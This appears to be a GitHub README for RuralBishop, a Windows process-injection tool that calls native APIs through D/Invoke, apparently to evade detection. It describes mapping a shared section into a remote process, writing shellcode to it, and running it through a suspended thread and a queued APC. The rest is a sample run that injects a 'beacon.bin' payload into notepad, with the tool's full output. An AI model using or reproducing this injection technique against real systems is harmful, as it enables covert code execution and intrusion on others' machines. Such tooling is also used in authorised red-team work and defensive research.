# RuralBishop

RuralBishop is practically a carbon copy of [UrbanBishop](https://github.com/FuzzySecurity/Sharp-Suite/tree/master/UrbanBishop) by b33f, but all [P/Invoke](https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) calls have been replaced with [D/Invoke](https://thewover.github.io/Dynamic-Invoke/).

This creates a local RW section in RuralBishop and then maps that section as RX into a remote process. Once the shared section has been established the shellcode is written to the local section which then automatically propagates to the remote process. For execution RuralBishop creates a remote suspended thread (start address is set to `ntdll!RtlExitUserThread`) and queues an APC on that thread.  Once resumed with `NtAlertResumeThread`, the shellcode executes and the thread exits gracefully on completion.

```
C:\> RuralBishop.exe -p C:\Users\Rasta\Desktop\beacon.bin -i 14680
   _O        _____             _
  / //\     | __  |_ _ ___ ___| |
 {     }    |    -| | |  _| .'| |
  \___/     |__|__|___|_| |__,|_|
  (___)
   |_|          _____ _     _
  /   \        | __  |_|___| |_ ___ ___
 (_____)       | __ -| |_ -|   | . | . |
(_______)      |_____|_|___|_|_|___|  _|
/_______\                          |_|
                  ~b33f~  ~rasta~

|--------
| Process    : notepad
| Handle     : 696
| Is x32     : False
| Sc binpath : C:\Users\Rasta\Desktop\beacon.bin
|--------

[>] Creating local section..
    |-> hSection: 0x2B4
    |-> Size: 261120
    |-> pBase: 0xC30000
[>] Map RX section to remote proc..
    |-> pRemoteBase: 0x1E5D86C0000
[>] Write shellcode to local section..
    |-> Size: 261120
[>] Seek export offset..
    |-> pRemoteNtDllBase: 0x7FFC44BA0000
    |-> LdrGetDllHandle OK
    |-> RtlExitUserThread: 0x7FFC44C0A2A0
    |-> Offset: 0x6A2A0
[>] NtCreateThreadEx -> RtlExitUserThread <- Suspended..
    |-> Success
[>] Set APC trigger & resume thread..
    |-> NtQueueApcThread
    |-> NtAlertResumeThread
```